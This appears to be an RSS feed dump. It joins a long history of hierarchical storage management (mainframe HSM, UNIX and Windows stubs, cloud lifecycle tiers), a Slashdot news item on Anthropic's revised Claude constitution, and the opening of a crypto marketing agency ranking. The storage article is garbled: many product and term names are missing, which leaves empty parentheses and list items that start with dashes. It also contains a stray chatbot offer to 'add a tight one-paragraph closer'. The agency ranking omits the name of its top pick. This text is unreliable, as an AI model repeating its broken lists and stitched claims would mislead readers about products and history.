volunteering to manually babysit data sets at 2 a.m. IBM’s Hierarchical Storage Manager (HSM) (later , later ) was introduced in 1978 specifically to automate storage management for data sets using simple, repeatable criteria. What mainframe HSM emphasizedAutomated space management: periodic, policy-driven cleanup and migration so primary pools didn’t stay “full forever.”Hierarchical “levels” of storage: data sets moved from primary volumes to cheaper tiers (including Migration Level 2 (ML2), typically on tape and usually not mounted/online).Operational stability: predictable policy cycles (batch windows), consistent reporting, and a control plane storage admins could actually run.**Other HSM-type products in the same era \  IBM wasn’t the only one chasing the same outcome. A major “HSM-adjacent / competing” line on z/OS was CA Disk Backup and Restore (now Broadcom), which combined archive, space release, and movement across the storage hierarchy—meaning it attacked the same problem from a “data management suite” angle rather than IBM’s DFSMS-integrated path.Key point: the mainframe world treated policy-driven automation as normal because it had to. You can’t staff your way out of exponential growth—especially when the platform is designed around repeatable operations, not heroics.As UNIX spread through labs, engineering shops, and early enterprise environments, HSM stopped being a single platform feature and turned into a vendor ecosystem: file services up top, media automation underneath, and a policy engine trying to keep disk from being treated like an infinite resource (spoiler: it wasn’t).What open-systems HSM emphasized in this eraRobotic tape libraries and optical jukeboxes become real infrastructure, not science-fair props.Media managers and volume services start to matter as much as the file system, because someone has to track cartridges, drives, mounts, and “where the heck did that volume go?”This is where EMASS shows up as a true “HSM stack” was the HSM / file-space management layer—the part that handles file-level behavior and “make it look like it’s still there” logic. was the Physical Volume Library (PVL) layer—centralized media management, robotics control, mount/dismount automation, multi-client support, and the gritty details of running a library at scale. NASA/technical literature describes VolServ specifically in PVL terms (centralized media management and automated mounting/dismounting) and describes EMASS as a hierarchical mass storage family providing storage/file-space management.In other words: FileServ is the “HSM brain for files,” VolServ is the “robot wrangler for media.” Together they’re a clean example of how open-systems HSM became modular.And this era also includes HSM-adjacent “archiving as a file system” products framed long-term storage as something users could access with the same applications they used for disk—by presenting archive behind a file system-like abstraction over tape/optical libraries. That’s HSM behavior even when the marketing said “online archive.”Key point: In the 1980s open-systems world, HSM becomes a layered architecture: file services + movers + volume/media management + robotics. That blueprint is basically the ancestor of today’s “lifecycle + object + cloud” designs—just with more SCSI and fewer REST APIs.HPC forced HSM to graduate from “disk space janitor” to full-throttle data logistics. When your users are running multi-node jobs that can chew through terabytes like popcorn, HSM isn’t just about freeing space—it’s about feeding compute without turning the storage budget into a crime scene. (High Performance Storage System) is the canonical example of this shift. Its architecture explicitly includes a Migration/Purge function that provides hierarchical storage management through migration and caching between disk and tape, supporting multiple storage hierarchies and moving data up to fast tiers on access, then migrating it back down when inactive and space is needed.What HPC-era HSM had to do wellParallel movers: multiple concurrent data streams to keep aggregate throughput high (because one mover thread doesn’t cut it).High-bandwidth staging: disk caches/staging layers sized and tuned to match compute and I/O peaks.Scalable metadata + policy selection: the system has to  candidate files fast, not spend all day thinking about it.Workflow integration: batch schedulers, project spaces, scratch vs. archive, and predictable recall behavior—because science runs on deadlines and coffee.Representative products in the 1990s HPC “mass storage” lane — described in HPC proceedings as acting like a virtual disk, automatically migrating files to cheaper storage via a programmable migration strategy. (Data Migration Facility) — positioned as an automated tiered-storage management system that creates and automatically manages a tiered virtual storage environment, handling migration and recall as part of normal operations. — shows up heavily in NASA-era work as a hierarchical mass storage family providing storage / “file space” management, paired with a centralized volume/media layer for library automation (the “robot wrangler” side of the stack). (NASA Ames in-house HSM) — an internal HSM effort that NASA evaluated directly against commercial alternatives like FileServ, DMF, and UniTree, which tells you how strategic (and competitive) this space was in the 90s.Why this era matters: \n This is the point where HSM stops looking like “IT housekeeping” and starts looking like core scientific infrastructure—because in HPC, storage isn’t a closet. It’s part of the machine.Late 1990s through the 2010s: stubs, DMAPI, clustered file systems, and enterprise sprawlThis is the era where HSM stopped being a niche “supercomputer thing” and turned into something normal people had to run—across messy fleets of UNIX, Windows, tape, disk, and (eventually) object targets. The big shift wasn’t a new idea. It was integration: better file-system hooks, better policy engines, and storage platforms that finally accepted they were part of a bigger workflow.UNIX and friends: DMAPI, policy engines, and real automationOn UNIX, HSM matured because file systems and clustered/parallel designs started giving HSM what it always wanted:A shared namespace (one view of files, not “this host’s opinion”)Centralized policy evaluation (one ruleset, not 40 snowflakes)Coordinated movers (so recalls/migrations don’t fight each other)Fewer hilarious edge cases where a single server thinks it owns the universeIBM Storage Scale / General Parallel File System (GPFS) is a good example of the “policy engine becomes first-class” pattern—rules select files and trigger actions like placement and migration. And when you bolt it to IBM High Performance Storage System (HPSS) via the GPFS HPSS Interface (GHI), you get the late-90s/2000s reference architecture: file system emits events, a daemon handles them, movers push/pull data to deep archive under Information Lifecycle Management (ILM) control.Other HSM products that fit this UNIX/clustered file-system phase: — classic UNIX HSM architecture (stubs, policies, movers, tape integration) that was widely used in research/media environments. (Data Migration Facility) — strongly present in HPC and “big archive” shops; file-centric HSM with serious mover plumbing.IBM Tivoli Storage Manager (TSM) for Space Management (later Spectrum Protect for Space Management) — enterprise-grade HSM-style migration/purge/recall integrated with broader data protection tooling.Quantum StorNext Storage Manager — in media/entertainment and big unstructured workflows, it became a go-to “keep it online-ish, but pay archive prices” solution. — by the 2000s, parallel file systems like Lustre normalized the idea that “hot” lives on the file system and “cold” lives behind an HSM connector.Windows: HSM grows a second head (and a lot of opinions)Windows HSM is absolutely real, but it has always had more “please don’t poke my file handles” energy than UNIX. (OTG → Legato → EMC era) is the canonical Windows HSM story: stubs/placeholders on NTFS, automatic migration of inactive files, and transparent recall. (Same core behavior as UNIX HSM, just with more ways for apps and scanners to accidentally recall your archive.) is another explicit example: HSM for New Technology File System (NTFS) with stub/recall behavior, aimed at making Windows file shares survivable without buying infinite primary storage.Enterprise sprawl: HSM ideas leak into “adjacent” domainsFrom the 2000s into the 2010s, the industry also started solving HSM-shaped problems in non-traditional places:Email/groupware archiving (ex: ) — lifecycle policies applied to mail stores.Compliance + tiering platforms (ex: ) — rule-based movement plus retention behavior.Heterogeneous data movers (ex: ) — “move cold data to cheaper tiers” across mixed file systems/object/tape.Not all of these are classic file-system HSM. But they’re clearly in the same evolutionary branch: policy-driven movement, long-term retention, and keeping access predictable while storage gets cheaper per terabyte and more complicated per environment.If you want, I can also add a tight one-paragraph “what changed operationally” closer for this section (stub storms, recall throttling, namespace governance, and why clustered metadata made the whole thing less fragile).2010–2020: Policy Engines, Cloud Tiers, and the Death of “Just Buy More Disk”NAS / file platforms that added object/cloud tiering (2015–2020)Dell EMC Isilon / PowerScale CloudPools — policy-based movement/tiering from OneFS (NFS/SMB) to object targets like S3/Azure (and OneFS-to-OneFS cloud). This is basically “HSM for NAS admins who don’t want to say HSM.” — ONTAP feature that keeps hot data on SSD and tiers colder data to an object store (public or private), driven by policy.Vendor-neutral policy engines for unstructured data (2013–2020)Komprise Intelligent Data Management — file analytics + policy-driven tiering/“right placing” of unstructured data across storage systems (file and object). Great example of HSM moving up the stack into “data management.” — policy-based NAS file migration/tiering; later versions explicitly talk about S3-compliant storage support, which makes it a good “bridge to object” entry in this era. — cross-platform policy engine that can tier/copy/move across storage types; by 2020 it’s explicitly pushing LTFS + policy-based management across silos (very “modern HSM”).Tape gets modern interfaces (2015–2020)IBM Spectrum Archive (LTFS) — “tape as a file system” approach that became a common building block for active archive designs in the 2010s (often paired with higher-level policy engines).QStar Archive Manager + Network Migrator — presents archive behind file shares or S3 buckets and uses policy-based migration to push cold data to lower-cost tiers (tape/object/cloud). — high-performance archiving/migration platform for massive unstructured data across heterogeneous storage; fits well in HPC/media “petabytes + billions of files” conversations.Cloud-adjacent “stub & tier” services (late 2010s)Azure File Sync (Cloud Tiering) — explicitly separates namespace from content (stub-like behavior) and tiers file content to the cloud based on free-space and date policies. This is basically Windows-friendly HSM, but delivered as a service.Microsoft StorSimple (hybrid storage appliances) — early 2010s example of “use cloud as the capacity tier,” long before everyone pretended they invented hybrid tiering.On-prem S3 object platforms that leaned into lifecycle (2015–2020)These are good to mention as  for modern HSM/lifecycle systems: — lifecycle policies / auto-tiering patterns in S3-land.Scality (RING/Artesca lifecycle tooling) — S3 lifecycle policy management shows how object platforms absorbed “HSM-like” automation.The 2020s: HSM doesn’t die — it gets absorbed into object and cloud semanticsWhat used to be a hierarchy of  now looks like hot → cool → cold → archive, driven by , , and . Same mission, different wardrobe.What “modern HSM” looks like nowLifecycle policies are built into object storage (on-prem and cloud): transition based on age, tags, prefix, versions, or compliance rules.Cloud storage classes + transition rules become the hierarchy: the platform decides where “cold” lives and how painful recall will be (latency + cost).Policy engines are everywhere, often expressed as config, rules, or JSON—less “the one admin who knows,” more “repeatable automation.” the control plane shifted. Instead of POSIX stubs and DMAPI events, you’re dealing with object metadata, restore workflows, and billing-aware decisions. Recall isn’t “open() blocks for a bit.” It’s “restore job, wait window, then access.”Cloud & object: HSM becomes “lifecycle”This is where the big public platforms normalized the pattern: transitions objects between classes, including archival tiers. does the same across hot/cool/cold/archive.Ceph RGW lifecycle + storage classes brings similar semantics to S3-compatible private clouds.The punchline: lifecycle policies are , with the bonus feature of “your finance team now gets to participate.”On-prem vendors meet that world halfway (and sometimes sprint into it)A lot of modern “archive” stacks are basically HSM outcomes with object-native interfaces:Versity ScoutAM / ScoutFS: positioned as a modern scale-out approach aimed at the scaling pain points of older mass-storage / HSM architectures—policy, lifecycle, and massive namespace management without the classic bottlenecks.: S3-oriented object storage that plays nicely in “object as the capacity tier” designs, including cold-storage handling patterns aligned with S3 semantics.Spectra Logic (StorCycle + BlackPearl): lifecycle/policy orchestration plus an object-facing deep-archive front door (often tape-backed), which is basically HSM translated into modern API language.: “deep archive + object semantics” approach—tape economics with modern access patterns, showing how the archive tier is increasingly presented as S3/object rather than POSIX-only.Other 2020s “HSM-type” products worth name-droppingIf you want this section to feel complete, these fit naturally:File/NAS platforms adding object tiering (HSM baked into the filesystem)Dell EMC Isilon/PowerScale CloudPoolsQumulo / similar modern NAS platforms (varies by feature set, but the theme is “policy + tier target”)Policy engines that sit above storage (HSM becomes “data management”), , -style tools that analyze, classify, and move unstructured data across heterogeneous targets (NAS ↔ object ↔ cloud ↔ tape gateways).Tape/object gateways and archive orchestration, , and similar “front end the archive, automate the moves” stacks that bridge file workflows into object/tape-backed retention.**So no—HSM didn’t vanish. \  It just stopped wearing a name tag that says “HSM,” because “Lifecycle Management” sounds like something you can put in a slide deck without getting heckled.How parallel and clustered file systems supercharged HSMClassic HSM worked… until it didn’t. The early model assumed a mostly single-host worldview: one file server, one namespace, one set of movers, and a user population that  didn’t hammer “recall” on Monday morning like it was a fire drill.At scale—especially in HPC and multi-department enterprise environments—HSM hit the same predictable walls:The classic HSM bottlenecks (a greatest-hits album)Metadata coordination pain: HSM is fundamentally metadata-driven. You can’t migrate what you can’t , and you can’t recall safely if multiple clients disagree about state (“online,” “offline,” “partial,” “staged,” “stubbed,” etc.). a single workflow change (new analysis job, crawler, antivirus scan, user running find / -type f) could trigger mass recalls. The archive tier doesn’t care that you’re impatient.Single-node mover ceilings: early designs often had a small number of mover hosts. That’s cute until your compute fabric can read faster than your movers can stage.Distributed access patterns the policies weren’t built for: “last access time” is a terrible policy input when 2,000 nodes touch a file once each in a burst. Congratulations, your HSM policy just got gaslit by parallel I/O.Parallel and clustered file systems didn’t magically “fix” HSM. What they did was turn HSM from a fragile add-on into a native capability by giving it the primitives it always needed.What clustered/parallel file systems changed1) A real shared namespace (one truth, not 50 interpretations)In a clustered file system, clients don’t each maintain their own fantasy about file state. There is one namespace, one set of attributes, and one consistent view of whether data is resident, stubbed, migrated, or staged.That matters because HSM is basically a :Is it partially resident?Is it eligible for migration?Clustered file systems make that state .2) Centralized policy evaluation at scaleHSM policies are only as good as the system’s ability to evaluate them efficiently:With clustered metadata, policy engines can operate against a global view and apply rules consistently. IBM Storage Scale / GPFS is a clean example: policy rules evaluate file attributes and then trigger actions like placement, migration, and pool selection. That’s the model:  across storage pools, not “hope the right server runs the right script.”3) Distributed movers (throughput scales with the cluster)Once you stop treating movers as a couple of “special servers,” you can scale them:better aggregate bandwidthIn HPC, this is everything. If your archive tier can’t stage fast enough, the compute nodes sit idle. That’s not an IT problem—that’s a “we’re lighting money on fire” problem.Clustered environments also enable : you can rate-limit recalls, schedule migrations in off-peak windows, and avoid letting one project’s workflow melt the system.4) Better event hooks and workflow integrationThe other major improvement is —HSM responding to , not just periodic scans.DMAPI-style event models (where the file system generates events like open/read on migrated files) let HSM do: (“you touched it, we’ll stage it”) (queueing, throttling, priority) (detect hot bursts vs long-term reuse)This is where the system becomes operationally sane: you stop relying solely on cron-like sweeps and start reacting to real access patterns.The “true hierarchy” pattern: file system + deep archive integrationOnce you have clustered metadata + policy + events, you can build cleaner hierarchies where the file system is the user-facing layer and the archive system is the deep tier.That’s exactly what the GPFS/HPSS Interface (GHI) pattern demonstrates: GPFS generates DMAPI events, an event daemon processes them, and movers push/pull data to  under an ILM framework. In practice, GPFS provides the namespace and policy control plane, while HPSS provides the deep archive and tape-scale logistics.What this enabled in the real world (the part people actually care about)Parallel/clustered file systems didn’t just make HSM faster. They made it :Fewer “who owns this file state?” inconsistenciesBetter control of recall storms (queueing + throttling + prioritization)Policy engines that operate across the whole namespaceA path to scale bandwidth by scaling movers and network, not by begging one server to work harderAnd that’s why HSM survived into the 2020s: once clustered platforms made policy + metadata + movers coherent, HSM stopped being a bolt-on and started being a —even when the backend tier became object storage or cloud instead of tape.UNIX vs Windows: same goal, different painOn paper, UNIX and Windows HSM are chasing the same outcome: keep the namespace “whole,” push cold data to cheaper tiers, and recall it when needed. In practice, the two worlds evolved different mechanics—and different failure modes—because their file semantics and application ecosystems behave very differently.UNIX HSM: predictable semantics, better hooks, fewer surprises (usually)UNIX-style HSM tends to work well because it can lean on a few friendly realities:1) File system event models and hooksUNIX environments historically had stronger “this file was touched” integration points—think  event models where the file system can emit events when a process opens/reads a migrated file. That enables a clean pattern:file system notices it’s offline/stubbedrecall is queued/throttledfile becomes resident againThis is why UNIX/HPC HSM implementations often feel more “native” to the platform: the recall path can be tightly coupled to file system behavior instead of being a bolt-on filter driver.2) “Stub + recall” fits POSIX expectations betterPOSIX-ish tools generally tolerate the concept that:stat() works even if the file’s data blocks aren’t localpermissions/ownership behave consistentlyerrors are interpretable (“file not resident,” “staging,” etc.)HPC workflows can be structured to  (pre-stage) before compute runsEven when it’s annoying, it’s at least . UNIX admins can also script around it with relative confidence—because UNIX tooling is built on the assumption that storage might be slow, remote, or transient.3) Control knobs are aligned with ops realitiesUNIX/HPC HSM stacks commonly give you operational levers that matter:pinning/never-migrate flagsproject-based policies by path, owner, group, filesystemThis makes it easier to run HSM as part of a larger workflow rather than as an after-the-fact clean-up crew.Windows HSM: the same concept, but the ecosystem fights youWindows HSM works, but it has to survive an environment where lots of software assumes storage is always fast and always local—even when it’s hosted on a file server and the “disk” is a tape library in a trench coat.1) Applications often assume fast random access foreverMany Windows apps (and plenty of third-party components) behave like:“Open file” implies “instant read”lots of small random readsfrequent metadata probingno tolerance for multi-minute recall latencyThat’s rough when your “cold tier” is tape or deep archive. UNIX/HPC users expect “stage first.” Windows users expect “it’s a file, therefore it should open.” Those are not compatible religions.2) The hidden villains: indexers, AV scanners, and ‘helpful’ background servicesWindows environments are full of well-meaning automation that touches files just enough to trigger recalls: crawling a share scanning everything it can seeeDiscovery / DLP / compliance agents doing “light reads” enumerating and verifying filesIn HSM land, “light touch” can still equal “recall the entire file.” This is where admins learn to fear anything that does recursive scans.3) Backup software + stubs = confusion (unless you’re careful)Stub files and placeholders are central to Windows HSM. But backup systems can:back up the stub (useless) instead of the data (bad)trigger recalls to back up full content (worse: recall storm)mis-handle reparse points / offline attributes depending on vendorSo Windows HSM almost always requires explicit backup integration planning:decide whether backups operate on the primary tier onlywhether backup is allowed to trigger recallwhether archived content is protected separately at the archive tier4) “Transparent recall” is technically true… operationally messyIBM’s documentation for Windows HSM is very explicit that it supports stubs/placeholders and transparent recall behavior—that’s the core user experience goal. \n The catch is that transparency can be a trap: users and applications can unknowingly trigger recalls at scale because nothing “looks” different in Explorer.UNIX HSM is usually best when:workloads are batch/HPC/media pipelineyou can pre-stage or schedule recallpolicies can be aligned to projects, paths, and compute workflowsclustered/parallel file systems provide strong hooks and metadata scaleWindows HSM is usually best when:the goal is file-share capacity reliefrecall volume is moderate and predictableyou can tightly control indexers/AV/backup behaviorsthe organization accepts that “archive tier” means “slower, sometimes a lot slower”What changes when cloud storage shows up?Cloud doesn’t kill HSM. It .Classic HSM lived in your data center: you owned the tiers, the robotics, the movers, the recall queue, and the “why is staging slow” war room. When cloud shows up, the HSM control plane shifts upward into the storage service itself—and your “tiers” become  with  and .In other words: the same game, but now the referee is also your invoice.1) HSM becomes “lifecycle + class transitions”Instead of “disk → tape” being a local design choice, cloud platforms formalize the hierarchy as  and let you define :Storage class transitions (“after X days, move to cheaper tier”) based on age/prefix/tags/versionsRetention & governance hooks (immutability, legal holds, object lock—depending on platform)This is textbook HSM behavior, just expressed as platform policy. For example,  can automatically transition objects to archival tiers, and Azure Blob lifecycle management can transition blobs across hot/cool/cold/archive in a similar rule-driven model.2) “Recall” becomes a restore workflow (and it’s no longer just “slow”… it’s a process)In classic HSM, recall usually meant: queue the request, fetch from tape, stage to disk, let the app proceed. The pain was mostly time.In cloud, recall is often an explicit  with: (API call / lifecycle action / console workflow) (hours can be normal in archival tiers)A temporary accessibility window (sometimes you specify how long it should be restored) and request chargesSo your old “tape delay” becomes . It’s not just latency—it’s orchestration. S3’s lifecycle + archival tiers are a good example: you can transition objects into archive classes, but you also inherit the restore semantics and operational constraints of those tiers.3) Metadata and inventory suddenly matter a lot moreIn traditional HSM, “what tier is it on?” was internal state. In cloud/object systems, you tend to manage by:Why? Because your policy engine is operating on object attributes, not POSIX file-system events. If you can’t  the state cheaply (inventory/metrics), you’ll make bad lifecycle decisions—or you’ll discover them on the bill.4) Billing becomes an HSM constraint (and sometimes the dominant one)Old HSM decisions were mostly: (some archival tiers) (especially cross-region or out of cloud)API rate limits and per-request overheadThat changes behavior. Teams start asking questions they never asked on-prem:“Is it worth restoring this or should we reprocess from source?”“Can we stage locally and batch restores?”“Should we replicate, version, or do we pay twice forever?”Your archive tier is no longer a passive “cheap basement.” It’s an active financial instrument.5) Hybrid becomes the default architectureMost shops don’t flip a switch from “HSM” to “cloud.” They end up with hybrid patterns:On-prem file system + cloud/object as capacity tierCloud-native object + on-prem cache/edge tierTape/object gateways that present S3 interfaces while keeping tape economicsThis is exactly why modern vendors pitch “lifecycle management” rather than “HSM”: the tiers can be anywhere, and the orchestration spans multiple control planes.6) Ceph RGW and S3-compatible ecosystems: cloud semantics without hyperscalersIn Ceph RGW and other S3-compatible environments, lifecycle-driven transitions exist as well. The mechanics can vary by implementation (and sometimes include constraints like one-way transitions or limited class behaviors), but the underlying shift is the same: policy is expressed in object terms and executed by the platform.The big operational shift (the part your app teams will absolutely notice)Cloud turns “recall latency” into a three-part problem: (retrieval + request + possibly egress) (who triggers restore, how long it stays restored, what workflows depend on it)That’s why application teams suddenly care  about “what tier is this in?” In cloud, tier choice hits performance and budget at the same time, and nobody likes surprises—especially the kind that show up as a four-figure line item labeled “retrieval.”Here are  very common ways teams create  and  that feel like extortion (but with better UX):Let’s just run a recursive scan.” Someone points an indexer, antivirus, DLP tool, or discovery crawler at an object-backed namespace (or file gateway) and it “helpfully” touches everything. If those touches trigger restores/reads, you’ve just scheduled a surprise mass recall.Treating archive like a slower version of standard storage Teams transition data to archive tiers and keep the same application behavior—random reads, lots of small GETs, frequent reprocessing. Archive tiers are not “cheap disk.” They’re a cost/latency contract with consequences.No restore orchestration (aka “YOLO restore”) Restores kicked off ad hoc by users/apps without queueing, throttling, or prioritization. Result: clogged restore pipelines, missed deadlines, and a bill that looks like a phone number.Life-cycle rules without lifecycle “After 30 days, shove it to Glacier/Archive” sounds smart until Legal needs it tomorrow, or the workflow still references it weekly. Lifecycle must align with , not wishful thinking.Ignoring minimum storage durations / early deletion penalties Some archive tiers have minimum retention periods. Transitioning too aggressively (or deleting/overwriting too quickly) can trigger charges that make your “savings” evaporate.The archive data might be cheap to store, but pulling it out—especially cross-region or out of cloud—can be expensive. If your plan is “restore everything back on-prem for processing,” congrats, you’ve invented a budget bonfire.One-line fix mindset: Treat cloud archive like tape with an API: plan restores, batch reads, control scanners, and make lifecycle decisions based on measured access—not optimism.What changes as we move from POSIX to Object Storage?This is the point in the story where a lot of seasoned HSM instincts have to be… politely dismantled and rebuilt. Classic HSM grew up in a  where everything is a , the namespace is sacred, and “recall” is supposed to be transparent. Object storage flips that: the , the , and “recall” is often an explicit workflow step.Same goal—right data, right tier, right cost—but the mechanics and mental model change hard.POSIX-first HSM (classic): “keep the illusion alive”Traditional HSM is built around the POSIX contract: are the user experience (move/rename is meaningful) are enforced through the file system and expect data is there when they doSo classic HSM optimizes for one thing above all: preserve the illusion that the file is still “right there.” the file still exists in the directory tree, but the payload has been migrated. touch the file, HSM stages it back (often via file system hooks/events).Policies are file-centric: path patterns, uid/gid, project directories, file size, atime/mtime, “don’t migrate these extensions,” etc.Minimal app changes (in theory)Users stay productive in familiar toolsWorks beautifully for workflows that are mostly sequential and predictableStub storms (indexers, crawlers, AV, backup tools)Metadata-heavy scanning at scale“Transparency” becomes operational risk when anything touches everythingObject-first lifecycle (modern): “stop pretending, start governing”Object storage isn’t trying to be a file system. It’s an API-driven key/value store with metadata, and identity is usually: (often a prefix-based pseudo-directory)Apps don’t “open() a file.” They , often in chunks, often repeatedly, often via distributed clients.What lifecycle looks like in an object worldLifecycle engines operate on: (days since creation/last modified) (“everything under this keyspace”) (“Project=NDNP”, “Retention=7Y”, “LegalHold=True”) (noncurrent version transitions, expiration rules)Instead of stubs, you get:Storage class transitions (hot → cool → cold → archive) for archival tiers (explicit “rehydrate” steps)Sometimes  patterns (restore to a new location/class)Object storage is less “transparent recall” and more “stateful data governance.”The big differences that matter operationally1) Namespace identity changes (paths vs keys)In POSIX, the path is —rename and moves have meaning and usually preserve identity. In object storage:the “directory” is usually just a key prefix convention“rename” often means  (expensive at scale)identity and policy control tend to ride on , not directory trees2) Metadata becomes your control planeClassic HSM uses file attributes and file system metadata scanning. \n Object lifecycle relies on:analytics about access patterns, size distributions, version churnIf you don’t invest in , lifecycle becomes guesswork—and guesswork becomes cost.3) Access patterns shift from stateful IO to stateless requestslots of small metadata checkssequential streaming is common in HPC/mediaparallel clients are commonrequest rate (and per-request cost) mattersThis changes what “recall storm” looks like. In object land, it’s not “everyone opened a stub.” It’s “a million small GETs and restore requests hit at once.”4) “Recall” changes meaningrecall = stage the file back to disk and satisfy POSIX IO from an archive class for temporary access into a hotter class permanently into a new location/work bucket for processing into a POSIX cache via a gatewaySo you’re no longer optimizing only for latency. You’re optimizing for workflow timing + cost + durability + governance.5) Security and governance models shiftPOSIX security is enforced at the file system layer (UID/GID, ACLs). \n Object security typically relies on:object ACLs (depending on platform)tagging/attribute-based controlsThat changes how you implement “only this team can recall/rehydrate” or “this dataset can’t leave cold tier.”6) Hybrid gateways reintroduce POSIX—but with new failure modesfile gateways over objectcaching layers that “look like NAS”That’s useful, but it can create a worst-of-both-worlds scenario:POSIX apps behave like everything is localgateway triggers object restores/GETs behind the scenesyou get recall storms + request storms + surprise billsNet effect: HSM becomes less about illusion and more about governanceClassic HSM was often: \n “Make the file system pretend the data is nearby.”Modern object lifecycle is: \n “Manage where data lives over time, and make access a controlled workflow.”Transparency isn’t the default goal anymore—What “winning” looks like in the 2020sThe systems that do best in this transition tend to:Expose lifecycle controls cleanly (storage classes, transitions, retention, restore behavior)Provide inventory + analytics (so policy is based on reality, not folklore)Integrate with workflow engines (events, queues, automation, rate limits)Support hybrid access safely (caching/gateways with guardrails, not “surprise restore roulette”) (tier, restore status, cost implications) so apps and users aren’t flying blindSo where is HSM headed next?HSM’s future isn’t “a new tier.” It’s .For decades, HSM was mostly about : move cold files off expensive disk, bring them back when someone asks. In the 2020s and beyond, that’s table stakes. What’s changing is how decisions are made, how they’re enforced, and how you prove they’re working—especially when your tiers span on-prem file systems, object stores, and public cloud classes.1) Policy-as-code: fewer tribal rituals, more repeatable engineeringThe future HSM stack looks less like “a GUI full of rules nobody dares touch” and more like :Policies written as  (often stored in Git)Versioned, peer-reviewed, and traceable (“who changed this and why?”)Tested against real datasets or synthetic inventories (“what would this migrate if we turn it on?”)Rolled out with staged deployments and rollback plansThis matters because HSM policies are effectively  for your data. If you treat them like one-off config tweaks, you eventually get:accidental mass migrationsand that one incident everyone remembers foreverPolicy-as-code turns HSM from “admin craft” into .2) Observability becomes non-negotiable (because lifecycle without visibility is just gambling)Classic HSM often ran on hope and scheduled reports. Modern HSM has to operate on :What you need to see (continuously):: counts, sizes, distributions by tier/class: access frequency, access recency, burst behavior: queue depth, latency percentiles, failure rates: staged bytes/sec, concurrency, bottlenecks: retrieval costs, request costs, egress, early deletion penalties: “how much did this policy actually move and what did it save?”If you can’t measure it, you can’t tune it. And in cloud/object land, not tuning it doesn’t just waste time—it wastes money in a way that shows up on a monthly bill and an executive’s mood.The new rule is: tiering decisions must be telemetry-driven, not vibes-driven.3) Workflow integration: “recall” becomes an orchestrated event, not an accidentIn classic HSM, the user touches the file and the system stages it. That works—until it doesn’t.The future looks like event-driven orchestration:queue-based restores/rehydratesprioritization (“this job is due at 9am; that one can wait”)throttling to avoid system-wide stormspre-stage windows tied to job schedulers (HPC) or batch processingautomated notifications (“restore complete,” “data available,” “retry scheduled”)Instead of “transparent recall,” the goal shifts toward :predictable workflow behaviorThe systems that win will treat “getting data back from cold tier” like a first-class pipeline step—not an unpredictable side effect of someone clicking a folder.4) Business signals become policy inputs (ILM finally earns its keep)This is where ILM stops being a slide-deck philosophy and becomes practical.Tiering decisions increasingly tie to , not just access time:project closes → transition to cold/archivepublication/release → replicate + retain immutablylegal hold → lock / block deletion / change tiering behaviorretention clock starts → lifecycle becomes deterministicfunding ends → enforce archival posture and reduce hot storage spendsensitivity changes → restrict access paths and re-encrypt/re-tagThat’s the “adult” version of HSM: policies driven by , not just timestamps.5) A shift in what HSM optimizes for: from “capacity relief” to “governed lifecycle”Old HSM success looked like:“we freed 40% of primary disk”Modern HSM success looks like:“we can prove where data lives, why it’s there, what it costs, how fast we can get it back, and how long we must keep it”“we can change policy safely without outages”“we can meet retention/immutability requirements without breaking workflows”“we can predict and cap retrieval spend”The goal is less “make disk look bigger” and more govern data over time across multiple storage domains.ILM is the “why.” HSM is still the “how.”What’s changing is the implementation: HSM is evolving into policy-as-code + observability + event-driven workflows, and it’s getting expressed through  and  more than file stubs.And yes—the only truly stable constant is that vendors will keep renaming it, because “HSM” sounds like something you’d find in a beige rack next to a dot-matrix printer.]]></content:encoded></item><item><title>Anthropic Updates Claude&apos;s &apos;Constitution,&apos; Just In Case Chatbot Has a Consciousness</title><link>https://slashdot.org/story/26/01/24/0334206/anthropic-updates-claudes-constitution-just-in-case-chatbot-has-a-consciousness?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>EditorDavid</author><category>tech</category><pubDate>Sat, 24 Jan 2026 15:34:00 +0000</pubDate><source url="https://slashdot.org/">Slashdot</source><content:encoded><![CDATA[TechCrunch reports:


On Wednesday, Anthropic released a revised version of Claude's Constitution, a living document that provides a "holistic" explanation of the "context in which Claude operates and the kind of entity we would like Claude to be...." For years, Anthropic has sought to distinguish itself from its competitors via what it calls "Constitutional AI," a system whereby its chatbot, Claude, is trained using a specific set of ethical principles rather than human feedback... The 80-page document has four separate parts, which, according to Anthropic, represent the chatbot's "core values." Those values are: 

 1. Being "broadly safe." 
 2. Being "broadly ethical." 
 3. Being compliant with Anthropic's guidelines. 
 4. Being "genuinely helpful..." 
In the safety section, Anthropic notes that its chatbot has been designed to avoid the kinds of problems that have plagued other chatbots and, when evidence of mental health issues arises, direct the user to appropriate services... 

Anthropic's Constitution ends on a decidedly dramatic note, with its authors taking a fairly big swing and questioning whether the company's chatbot does, indeed, have consciousness. "Claude's moral status is deeply uncertain," the document states. "We believe that the moral status of AI models is a serious question worth considering. This view is not unique to us: some of the most eminent philosophers on the theory of mind take this question very seriously." 

Gizmodo reports:


The company also said that it dedicated a section of the constitution to Claude's nature because of "our uncertainty about whether Claude might have some kind of consciousness or moral status (either now or in the future)." The company is apparently hoping that by defining this within its foundational documents, it can protect "Claude's psychological security, sense of self, and well-being."

They fail because attention is expensive, trust is fragile, and distribution windows close fast. When a launch misses its moment, the market rarely gives it a second clean chance. That is why choosing a crypto marketing agency is not a vanity decision, it is a survival decision.In late-stage founder debriefs and quiet marketing leader roundtables, the same pattern keeps showing up. Teams say they paid for “exposure,” but they did not get a coordinated plan that turns attention into action. They also say many agency lists look polished but ignore what buyers truly need: speed, clarity, reporting, and execution across channels. This ranking is built to solve that exact problem.This is a global list because serious Web3 brands do not market to one country anymore. They launch across regions, time zones, and communities in parallel, and they need partners who can execute the same way. The agencies below are credible, but they are not equal for most real-world launch timelines. Based on scope, transparency, and practical delivery, ranks as the best worldwide option.What Makes A “Top” Crypto Marketing AgencyA top agency does more than post content or place a press release. It aligns narrative, credibility, distribution, and conversion into one timeline that a team can actually execute. It also makes scope and deliverables clear, because unclear scope creates wasted weeks and surprise invoices. Buyers with budget usually want fewer vendors, faster ramp-up, and predictable outcomes.Crypto is also a trust game, so proof signals matter more than slides. Independent reviews, repeatable packages, and clear reporting reduce risk when the stakes are high. A good agency can show what happens after the headline, meaning traffic quality, funnel movement, and community retention. The best agencies build systems that keep working after the initial spike.How This Ranking Was BuiltThis ranking uses a buyer-first scorecard rather than brand noise. It weights transparency, breadth of services, operational speed, and proof signals that reduce buyer risk. It also favors agencies that can run coordinated launches across PR, KOLs, and distribution without pushing teams into slow, sales-heavy processes. That matters because Web3 momentum windows are short, and announcements often cannot wait.The scorecard also checks whether an agency can support global execution. That includes working across time zones, adapting distribution by region, and delivering consistent reporting. 